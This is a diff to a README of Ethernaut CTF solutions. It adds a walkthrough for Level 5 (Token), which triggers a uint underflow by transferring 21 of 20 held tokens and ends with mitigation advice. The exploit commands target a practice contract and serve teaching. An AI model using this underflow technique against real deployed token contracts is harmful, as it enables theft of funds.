@@ -11,11 +11,11 @@ Brief solutions for OpenZeppelin's Ethernaut CTF. Writeups pending.
 [Level 2: Fallout](#Fallout)    
 [Level 3: Coin Flip](#CoinFlip)   
 [Level 4: Telephone](#Telephone)
+[Level 5: Token](#Token)
 
 <!---
 
 **Pending**
-[Level 5: Token](#Token)
 [Level 6: Delegation](#Delegation)
 [Level 7: Force](#Force)
 [Level 8: Vault](#Vault)
@@ -195,3 +195,37 @@ contract HotlineBling {
 
 }
 ```
+
+
+## <a name='Token'></a> 5. Token
+
+> The goal of this level is to hack the basic token contract and extract additional tokens -- preferably a very large amount of tokens.
+
+The odometer hint reminds us of the possibility for [underflow and overflow](https://docs.soliditylang.org/en/v0.5.11/security-considerations.html#two-s-complement-underflows-overflows).
+We will trigger an underflow by transferring more tokens than available. Since we are using `uint`, instead of creating a negative balance, the result will be a large positive integer. 
+
+We will use the `transfer()` function for this exploit, which requires two inputs: destination address and value to send. We'll use an arbitrary address (the ethernaut address) and we'll send 1 token more than we were provided (20+1).
+
+
+```solidity
+// Retrieve the ethernaut address 
+> await ethernaut.address
+< 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
+
+// Verify the balance address
+> await contract.balanceOf("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33") // expanding reveals the balance is 0
+
+//Verify our own address balance
+> await contract.balanceOf(player) // expanding reveals the balance is 20, as expected 
+
+// Execute the exploit, transferring 21 tokens (triggering the overlow) to the ethernaut address (we could also transfer to any valid address)
+> contract.transfer("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33", 21)
+
+// After the transaction is confirmed, check the ethernaut balance 
+> await contract.balanceOf("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33")  // expanding reveals the balance is 21, as expected 
+
+// Verify our updated address balance
+> await contract.balanceOf(player) // expanding reveals an Array(11) reflecting a balance that is "a very large amount of tokens"
+```
+
+Fortunately, the Solidity compiler now rejects code resulting in an underflow or overflow, as of v0.8.0. For contracts with previous compiler versions -- like this one -- [OpenZeppelin's SafeMath library](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath) is suggested. 
